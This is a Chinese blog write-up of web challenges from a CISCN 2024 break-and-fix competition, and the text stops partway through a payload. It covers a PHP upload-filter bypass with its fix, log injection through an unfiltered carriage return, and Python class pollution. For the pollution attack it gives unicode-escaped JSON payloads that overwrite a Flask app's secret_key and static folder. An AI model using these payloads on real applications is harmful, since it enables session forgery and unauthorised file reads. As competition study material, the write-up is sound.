    <id>http://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/</id>
    <published>2024-06-23T01:03:08.000Z</published>
    <updated>2024-07-20T00:48:20.087Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>⚠热异常⚠</p><p>办的很好，下次别在fjnu办了，切割了（（</p><p><del>现在是6月23号早上的8点36，星期天；24号，高等数学，（差）一章没看，27号，概率论，还行，还剩题没做…欸这茶歇东西还挺多ww</del></p><p>是web的wp</p><p>由我和@Laffey共同完成，个人对web的评价是纯拼积累，线下断网情况下有一个自己的本地博客太重要了，然后就是老赛棍魅力时刻（</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165857174.png" alt="image-20240623165857174"></p><span id="more"></span><hr><h1 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h1><p>ctrl+u</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623090909287.png" alt="image-20240623090909287"></p><hr><h1 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h1><h2 id="BREAK"><a href="#BREAK" class="headerlink" title="BREAK"></a>BREAK</h2><p>服务器不知道检查了什么东西，直接burp改后缀传马</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623164803273.png" alt="image-20240623164803273"></p><h2 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h2><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623164921584.png" alt="image-20240623164921584"></p><p>对文件后缀名作白名单处理，然后对文件内容的过滤多一个php文件开始标识符</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// $path = "./uploads";</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./uploads"</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"只允许png哦!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$allow_content_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"myfile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$allow_content_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"只允许png哦!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(&lt;\?|php|script|xml|user|htaccess)/i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// echo "匹配成功!";</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'鼠鼠说你的内容不符合哦0-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Success!&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Error!&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="粗心的程序员"><a href="#粗心的程序员" class="headerlink" title="粗心的程序员"></a>粗心的程序员</h1><h2 id="BREAK-1"><a href="#BREAK-1" class="headerlink" title="BREAK"></a>BREAK</h2><p>扫目录发现有源码泄露。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165059136.png" alt="image-20240623165059136"></p><p>居然敢写日志在php文件里面。</p><p>只把换行符给过滤了(\n)，没过滤回车(\r)。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165123023.png" alt="image-20240623165123023"></p><p>然后访问一次home.php，再去config.php。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165150741.png" alt="image-20240623165150741"></p><h2 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h2><p>直接把写日志的操作删掉。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165240719.png" alt="image-20240623165240719"></p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phperror_reporting(0);include &quot;default_info_auto_recovery.php&quot;;session_start();$username &#x3D; $_SESSION[&#39;username&#39;];$id &#x3D; $_SESSION[&#39;id&#39;];if ($username &amp;&amp; $id) &#123;echo &quot;Hello,&quot; . &quot;$username&quot;;&#125; else &#123;die(&quot;NO ACCESS&quot;);&#125;?&gt;&lt;br&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;jquery-1.9.0.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;jquery.base64.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;function submitData() &#123;var obj &#x3D; new Object();obj.name &#x3D; $(&#39;#newusername&#39;).val();var str &#x3D;$.base64.encode(JSON.stringify(obj.name).replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;\&quot;&quot;, &quot;&quot;));$.post(&quot;edit.php&quot;, &#123;newusername: str&#125;,function(str) &#123;alert(str);location.reload()&#125;);&#125;jQuery.base64 &#x3D; (function($) &#123;var keyStr &#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;&quot;;function utf8Encode(string) &#123;string &#x3D; string.replace(&#x2F;\r\n&#x2F;g, &quot;\n&quot;);var utftext &#x3D; &quot;&quot;;for (var n &#x3D; 0; n &lt; string.length; n++) &#123;var c &#x3D; string.charCodeAt(n);if (c &lt; 128) &#123;utftext +&#x3D; String.fromCharCode(c);&#125; else if ((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123;utftext +&#x3D; String.fromCharCode((c &gt;&gt; 6) | 192);utftext +&#x3D; String.fromCharCode((c &amp; 63) | 128);&#125; else &#123;utftext +&#x3D; String.fromCharCode((c &gt;&gt; 12) | 224);utftext +&#x3D; String.fromCharCode(((c &gt;&gt; 6) &amp; 63) | 128);utftext +&#x3D; String.fromCharCode((c &amp; 63) | 128);&#125;&#125;return utftext;&#125;function encode(input) &#123;var output &#x3D; &quot;&quot;;var chr1, chr2, chr3, enc1, enc2, enc3, enc4;var i &#x3D; 0;input &#x3D; utf8Encode(input);while (i &lt; input.length) &#123;chr1 &#x3D; input.charCodeAt(i++);chr2 &#x3D; input.charCodeAt(i++);chr3 &#x3D; input.charCodeAt(i++);enc1 &#x3D; chr1 &gt;&gt; 2;enc2 &#x3D; ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);enc3 &#x3D; ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);enc4 &#x3D; chr3 &amp; 63;if (isNaN(chr2)) &#123;enc3 &#x3D; enc4 &#x3D; 64;&#125; else if (isNaN(chr3)) &#123;enc4 &#x3D; 64;&#125;output &#x3D; output +keyStr.charAt(enc1) + keyStr.charAt(enc2) +keyStr.charAt(enc3) + keyStr.charAt(enc4);&#125;return output;&#125;return &#123;encode: function(str) &#123;return encode(str);&#125;&#125;;&#125;(jQuery));&lt;&#x2F;script&gt;更改用户名&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;newusername&quot; id&#x3D;&quot;newusername&quot; value&#x3D;&quot;&quot;&gt;&lt;button type&#x3D;&quot;submit&quot; onclick&#x3D;&quot;submitData()&quot;&gt;更改&lt;&#x2F;button&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Polluted"><a href="#Polluted" class="headerlink" title="Polluted"></a>Polluted</h1><h2 id="BREAK-2"><a href="#BREAK-2" class="headerlink" title="BREAK"></a>BREAK</h2><p>斩下二血</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> json<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">generate_random_md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random_string <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>random_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklisted_patterns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'string'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pattern <span class="token keyword">in</span> blacklisted_patterns<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> user_input<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Recursive merge function</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> generate_random_md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> password    Evil <span class="token operator">=</span> evil<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> Evil<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">templates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">and</span> password<span class="token punctuation">:</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"adminer"</span> <span class="token keyword">and</span> password <span class="token operator">==</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"important.html"</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello,  This is the POLLUTED page.'</span></span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原型链污染</p><p>过滤<code>&#39;init&#39;, &#39;global&#39;, &#39;env&#39;, &#39;app&#39;, &#39;_&#39;, &#39;string&#39;</code>，直接unicode绕过</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"adminer"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0061\u0070\u0070"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"secret\u005fkey"</span><span class="token operator">:</span><span class="token string">"114514"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就污染了，session本地生成一个：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"adminer"</span>session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"114514"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623100402510.png" alt="image-20240623100402510"></p><p>然后带这个cookie去靶机</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623100650218.png" alt="image-20240623100650218"></p><p>嗯？我flag呢？</p><p>那就用之前boogipop的非预期打法，污染静态文件夹位置：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"adminer"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0061\u0070\u0070"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005fstatic\u005ffolder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后访问：<code>/static/flag</code>即可</p><p>预期解：<a href="https://www.cnblogs.com/gxngxngxn/p/18264279">https://www.cnblogs.com/gxngxngxn/p/18264279</a></p><p>我们知道python的模板渲染标识符一般是<code>&#123;&#123;&#125;&#125;</code>，所以上面输出<code>[%flag%]</code>是因为没渲染成功，需要污染jinja2的语法标识符为<code>[%%]</code></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span> <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span 